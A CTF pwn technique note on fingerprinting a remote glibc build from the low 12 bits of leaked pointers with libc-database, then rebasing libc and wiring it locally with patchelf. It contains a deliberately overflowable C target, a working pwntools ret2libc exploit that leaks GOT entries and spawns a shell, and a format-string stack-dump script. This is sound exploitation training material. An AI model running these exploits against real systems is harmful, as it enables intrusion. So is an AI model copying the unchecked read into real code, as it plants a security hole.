---
title: "libc Identification - From a Partial Leak to the Exact Build"
category: pwn
subcategory: libc
type: technique
tags: [libc-database, libc-base, libc-identification, ret2libc, aslr, got, plt, info-leak, one-gadget, symbol-offset, page-offset, puts, printf, read, system, pwntools, pwninit, patchelf, ldd, readelf]
difficulty: medium
summary: "Page alignment fixes the low 12 bits of every libc symbol, so two leaked pointers fingerprint the exact glibc build; then rebase, patch, and test locally."
when_to_use:
  - "The challenge gives you a binary and a host but no libc.so.6"
  - "Your ret2libc works locally and segfaults remotely - the remote glibc is a different build"
  - "You have one or two leaked libc addresses and need system/one_gadget offsets"
  - "You have a libc.so.6 but no ld-linux, and the binary refuses to run against it"
  - "You leaked a stack value that looks like a return address into __libc_start_main"
tools: [libc-database, pwninit, patchelf, ldd, readelf, pwntools, one_gadget, checksec, gdb, strings]
related: [rop-ret2libc, rop-one-gadget, rop-got-overwrite, mitigation-modern-playbook, mitigation-canary-bypass, mitigation-partial-overwrite-brute, fmtstr-read-leak, stack-uninitialized-leak, pwntools-cheatsheet, exploit-template]
---

## TL;DR

Every libc mapping is page aligned, so `leaked_addr & 0xfff == symbol_offset & 0xfff` no matter
what ASLR did. Those three hex nibbles are a fingerprint: one symbol narrows glibc to a handful
of builds, two symbols almost always pin exactly one, three is certain. Once you know the build,
`libc_base = leak - offset`, and every other symbol follows.

## Recognise it

- The challenge ships `./vuln` and `nc host port`, but no `libc.so.6` in the archive.
- Your exploit pops a shell locally and gives `SIGSEGV` / `SIGILL` remotely, usually a few
  hundred bytes inside what you *think* is `system`.
- The computed base does not end in `000` -- you used the wrong symbol offset.
- The remote banner or an error message leaks a version string (`GLIBC_2.35`, a distro build id).
- The challenge ships `libc.so.6` but **not** `ld-linux-x86-64.so.2`, and running the binary
  against the shipped libc fails with a loader/version error.

## Vulnerable source

```c
/* vuln.c - a plain GOT-leak target: two output calls, one overflow, no libc shipped */
#include <stdio.h>
#include <unistd.h>

void vuln(void) {
    char buf[64];
    puts("input:");
    read(0, buf, 0x200);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("ready\n");
    vuln();
    return 0;
}
```

```sh
# no PIE so the PLT/GOT are literals, NX on, no canary: the classic ret2libc shape
gcc -fno-stack-protector -no-pie -z noexecstack -o vuln vuln.c

ldd ./vuln                                  # the libc the loader picks locally
readelf -r ./vuln | grep -E "puts|printf"   # the GOT slots you are going to leak
strings ./libc.so.6 | grep "GNU C Library"  # if you were given one, read its version first
```

## Theory

### Why three nibbles identify a build

`libc_base` is page aligned, so for any symbol `s`:

```
runtime(s) = libc_base + offset(s)
runtime(s) & 0xfff == offset(s) & 0xfff        <- ASLR never touches these 12 bits
```

Different glibc builds (different distro, version, patch level, architecture) lay their symbols
out differently, so the triple `(puts & 0xfff, printf & 0xfff, read & 0xfff)` is effectively a
hash of the build. A database of dumped libcs can be searched by it.

One symbol alone typically matches 5-50 builds; two usually leave exactly one. Survivors are
often the same code under different package names -- if `system` and `str_bin_sh` agree across
them, pick any.

### The libc-database workflow

`libc-database` is a local clone of dumped libcs plus a search index. The four commands you need:

```sh
# one-time: fetch a pile of libcs (pick the sets you care about; ubuntu is the CTF default)
./get ubuntu
./get debian
./get all                     # large, but you only do it once

# add a libc you already have (a challenge-provided one, or one pulled off a box)
./add ./libc.so.6

# search by leaked low 12 bits - NO 0x, just the last 3 nibbles of each leak
./find puts 5f0 printf 800
# ubuntu-glibc (libc6_2.35-0ubuntu3_amd64)

# print the offsets you need from the match
./dump libc6_2.35-0ubuntu3_amd64
./dump libc6_2.35-0ubuntu3_amd64 puts system str_bin_sh __libc_start_main_ret
```

`./dump` with no symbol list prints the default set: `__libc_start_main_ret`, `dup2`, `printf`,
`puts`, `read`, `str_bin_sh`, `system`, `write`. The matched `.so` files live under `libs/` in the
clone, so a successful `./find` already leaves you a local copy to `ELF()` and to run against.

Web front-ends (libc.rip, and blukat-style "search by symbol" pages) take the same input: symbol
name plus the last three nibbles, one or more pairs. Handy with no local clone -- but keep the
local clone, offline CTFs are exactly what it is for.

### Which symbols to leak

Rank by how easy they are to get and how discriminating they are:

1. **GOT entries** of functions the program actually imports and has already called
   (`puts`, `printf`, `read`, `write`, `setvbuf`, `__libc_start_main`). Leak two or three in one
   chain: `puts(got['puts'])` then return to main, or a single chain with several `puts` calls.
2. **`__libc_start_main_ret`** -- the return address of `main`, which lives on the stack a fixed
   distance below `main`'s frame. On glibc 2.34+ it points into `__libc_start_call_main`, but
   `libc-database` indexes it under the name `__libc_start_main_ret` either way. This is the
   symbol to use when you have a **stack** leak (format string, uninitialised read) rather than
   a GOT read: `./find __libc_start_main_ret 083`.
3. **`_IO_2_1_stdout_` / `stdout`** -- often visible in stack dumps and heap metadata, and
   another indexed symbol. (A `one_gadget` offset is *not* a symbol; you cannot search by it.)

### Computing the base from a single leak

Once the build is known, one leak is enough forever:

```text
libc.address = leak - libc.symbols["puts"]      # must end in 000
system       = libc.symbols["system"]           # already rebased by pwntools
binsh        = next(libc.search(b"/bin/sh\x00"))
```

The `& 0xfff == 0` check is the most valuable assertion in a ret2libc script: a base that is not
page aligned means a bad parse (trailing `\n`, missing byte) or the wrong symbol subtracted.

### Wiring the downloaded libc up locally

You cannot just drop a foreign `libc.so.6` next to the binary: the **loader** (`ld-linux`) must
match, or you get `version GLIBC_2.34 not found` or a segfault in the dynamic linker.

```sh
# easiest: pwninit fetches the matching ld, patches the binary, and writes a template
pwninit --bin ./vuln --libc ./libc.so.6

# manual equivalent
patchelf --set-interpreter ./ld-2.35.so --replace-needed libc.so.6 ./libc.so.6 ./vuln
patchelf --set-rpath . ./vuln          # or --set-rpath $PWD
ldd ./vuln                             # verify it now resolves to YOUR libc

# quick-and-dirty test without patching (works only when the loader is compatible)
LD_PRELOAD=./libc.so.6 ./vuln
```

From pwntools, without touching the binary on disk:
`io = process([BINARY], env={"LD_PRELOAD": "./libc.so.6"})`.

`LD_PRELOAD` is fine for a quick check but it keeps the *system* loader, so it breaks as soon as
the version gap is wide. `patchelf --set-interpreter` is the reliable route. Note the loader's
own file name encodes the version (`ld-2.31.so`, `ld-2.35.so`), and `libc-database`'s `libs/`
directory ships the matching `ld` alongside each libc.

## Attack

1. Leak **two** libc pointers in one run. GOT entries are cheapest; `__libc_start_main_ret` from
   a stack dump is the fallback.
2. Take the last 3 hex nibbles of each: `hex(leak & 0xfff)[2:]`, zero-padded to 3.
3. `./find sym1 abc sym2 def`. If several hits, leak a third symbol and re-run.
4. `./dump <id>` for `system`, `str_bin_sh`, `__libc_start_main_ret`, and whatever else the chain
   needs. Copy `libs/<id>.so` next to the binary as `libc.so.6`.
5. Wire it up: `pwninit`, or `patchelf --set-interpreter ./ld-x.so --replace-needed libc.so.6
   ./libc.so.6 ./vuln`. Confirm with `ldd`.
6. Rebase: `libc.address = leak - libc.symbols[sym]`. Assert `libc.address & 0xfff == 0`.
7. Build the chain against the rebased `ELF` and test locally against the patched binary before
   firing remotely.
8. If the remote still misbehaves, one of the surviving candidates was the wrong one -- try the
   next `./find` hit, they differ by only a few hundred bytes in `system`.

## Exploit

```python
#!/usr/bin/env python3
"""Leak two GOT entries, print a ready-to-paste libc-database query, then (if a libc is
available) rebase it and pop a shell.

Pass LIBC=./libc.so.6 once you have identified and downloaded the right build.

Local:  ./exploit.py                    Remote: ./exploit.py HOST PORT
Build:  gcc -fno-stack-protector -no-pie -z noexecstack -o vuln vuln.c
Wire:   patchelf --set-interpreter ./ld-2.35.so --replace-needed libc.so.6 ./libc.so.6 ./vuln
"""
import sys

from pwn import *

BINARY = "./vuln"
LIBC = "./libc.so.6"
OFFSET = 72                      # 64 byte buffer + saved rbp; verify with cyclic
LEAK_SYMS = ["puts", "printf"]   # GOT entries to read; both must already be resolved

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "info"


def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    if args.GDB:
        return gdb.debug(BINARY, gdbscript="b *vuln+30\nc\n")
    if os.path.exists(LIBC) and args.PRELOAD:
        return process([BINARY], env={"LD_PRELOAD": LIBC})
    return process(BINARY)


def leak_symbols(io):
    """One chain: puts(got[a]); puts(got[b]); return to main."""
    rop = ROP(elf)
    for name in LEAK_SYMS:
        rop.call("puts", [elf.got[name]])
    rop.raw(elf.symbols["main"])
    log.info("leak chain:\n%s", rop.dump())

    io.recvuntil(b"input:")
    io.sendline(flat({OFFSET: rop.chain()}, filler=b"A"))

    leaks = {}
    for name in LEAK_SYMS:
        line = io.recvline().strip()
        if not line:                       # puts() emits a bare newline for the chain itself
            line = io.recvline().strip()
        leaks[name] = u64(line.ljust(8, b"\x00"))
        log.success("%-8s @ %#x   (low 12 bits: %03x)", name, leaks[name], leaks[name] & 0xFFF)
    return leaks


def print_query(leaks):
    query = " ".join("%s %03x" % (n, v & 0xFFF) for n, v in leaks.items())
    log.warning("libc-database:  ./find %s", query)
    log.warning("then:           ./dump <id> %s system str_bin_sh __libc_start_main_ret",
                LEAK_SYMS[0])


def main():
    io = start()
    leaks = leak_symbols(io)
    print_query(leaks)

    if not os.path.exists(LIBC):
        log.warning("no %s yet - run the ./find above, copy libs/<id>.so here, rerun", LIBC)
        io.close()
        return

    libc = ELF(LIBC, checksec=False)
    anchor = LEAK_SYMS[0]
    libc.address = leaks[anchor] - libc.symbols[anchor]
    if libc.address & 0xFFF:
        log.failure("base %#x not page aligned - wrong libc or bad parse", libc.address)
        io.close()
        return
    log.success("libc base = %#x", libc.address)

    # cross-check: every other leak must agree with this base
    for name, value in leaks.items():
        expect = libc.address + libc.symbols[name]
        if expect != value:
            log.failure("%s mismatch: leaked %#x, this libc says %#x", name, value, expect)
            io.close()
            return
    log.success("all leaks agree - this is the right build")

    rop = ROP(libc)
    rop.raw(rop.find_gadget(["ret"]).address)         # movaps alignment
    rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])

    io.recvuntil(b"input:")
    io.sendline(flat({OFFSET: rop.chain()}, filler=b"B"))
    io.sendline(b"id; cat flag.txt; cat /flag*")
    io.interactive()


if __name__ == "__main__":
    main()
```

### Identify from a stack leak (`__libc_start_main_ret`)

```python
#!/usr/bin/env python3
"""No GOT read available - fingerprint libc from a stack dump instead.

Any stack read exposes main's return address, which points into __libc_start_main (or
__libc_start_call_main on glibc 2.34+). libc-database indexes that pointer as
__libc_start_main_ret, so its low 12 bits are a valid search term on their own.

Local: ./stackid.py    Remote: ./stackid.py HOST PORT
Build: gcc -fno-stack-protector -no-pie -z noexecstack -o fmtvuln fmtvuln.c
"""
import sys

from pwn import *

BINARY = "./fmtvuln"
FIRST, LAST = 1, 40

context.binary = ELF(BINARY, checksec=False)
context.log_level = "error"


def dump():
    """Read stack slots FIRST..LAST through one format string."""
    io = remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) >= 3 else process(BINARY)
    values = []
    try:
        io.sendline(b"|".join(("%%%d$p" % i).encode() for i in range(FIRST, LAST + 1)))
        for token in io.recvline_contains(b"0x", timeout=2).strip().split(b"|"):
            try:
                values.append(int(token, 16))
            except ValueError:
                values.append(None)
    except EOFError:
        pass
    try:
        io.close()
    except EOFError:
        pass
    return values


def classify(value):
    """Cheap heuristics for what a leaked x86-64 pointer is."""
    if value is None or value < 0x1000:
        return None
    if (value & 0xFF) == 0 and (value >> 40) == 0:
        return "canary?"
    if 0x7F00 <= (value >> 32) <= 0x7FFF:
        return "libc/stack/mmap"
    if 0x55 <= (value >> 40) <= 0x56:
        return "pie binary"
    return None


def main():
    for i, value in enumerate(dump(), start=FIRST):
        tag = classify(value)
        if tag:
            log.warning("%%%d$p = %#018x  %-16s low12=%03x", i, value, tag, value & 0xFFF)
    log.warning("pick main's return address, then:  ./find __libc_start_main_ret <low 3 nibbles>")
    log.warning("  ./dump <id> __libc_start_main_ret system str_bin_sh")
    log.warning("  libc.address = leak - offset(__libc_start_main_ret)")


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **Ambiguous match.** Two symbols leaving 3-4 candidates is common for near-identical point
  releases. Leak a third, or try each candidate's `system` offset -- they fail loudly and cheaply.
- **No match at all.** Either the build is not in your clone (`./get` more distros, or use a web
  front-end), or the target is **musl** / **uClibc** / Alpine / static, none of which live in a
  glibc database. `file ./vuln` and `strings ./vuln | grep -i musl` settle it.
- **Wrong nibble count.** The query wants **3** nibbles (12 bits), not 4 and not 2. Zero-pad:
  `"%03x" % (leak & 0xfff)`.
- **Leaking an unresolved GOT slot.** Under lazy binding (Partial RELRO) a slot that was never
  called still holds a PLT stub address in the *binary*, which matches nothing. Leak a function
  the program has already used. BIND_NOW resolves everything at load time, so this goes away.
- **Trailing newline in the leak.** `u64(line.strip().ljust(8, b"\x00"))`: a 6-byte address plus
  `\n` is 7 bytes, and forgetting `.strip()` shifts everything by one.
- **`ldd` does not show your libc after patching.** You set the interpreter but not the rpath.
  Use `patchelf --set-rpath $PWD` or `--replace-needed libc.so.6 ./libc.so.6`.
- **`ld` version mismatch.** Symptoms: `version 'GLIBC_2.34' not found`, or an immediate crash
  inside the dynamic linker. The loader must come from the same build as the libc.
- **Local success, remote failure, identical offsets.** Not the libc then: check `movaps`
  alignment, a stale `one_gadget` constraint, or output buffering. And rerun `one_gadget` on the
  *identified* libc -- gadget offsets are per-build.
- **Docker as ground truth.** A shipped Dockerfile's base image tag names the distro release,
  and usually the exact glibc package, with no leak at all.

## Tools

| Tool | Use |
|---|---|
| `libc-database` `./get` | Populate the local corpus (once, ahead of time) |
| `libc-database` `./add ./libc.so.6` | Index a libc you were handed, so `./find` knows it |
| `libc-database` `./find puts 5f0 printf 800` | Identify the build from leaked low 12 bits |
| `libc-database` `./dump <id> system str_bin_sh` | Offsets for the chain, straight from the match |
| `pwninit --bin ./vuln --libc ./libc.so.6` | Fetch the matching `ld`, patch the binary, emit a template |
| `patchelf --set-interpreter ./ld-2.35.so --replace-needed libc.so.6 ./libc.so.6 ./vuln` | Manual wiring |
| `ldd ./vuln` | Verify which libc/loader the patched binary actually resolves to |
| `strings ./libc.so.6 \| grep "GNU C Library"` | Read the version directly out of a provided libc |
| `one_gadget ./libc.so.6` | Re-derive gadget offsets for the identified build |
| `pwntools` `ELF.address`, `ELF.search` | Rebase and locate `/bin/sh` once the build is known |
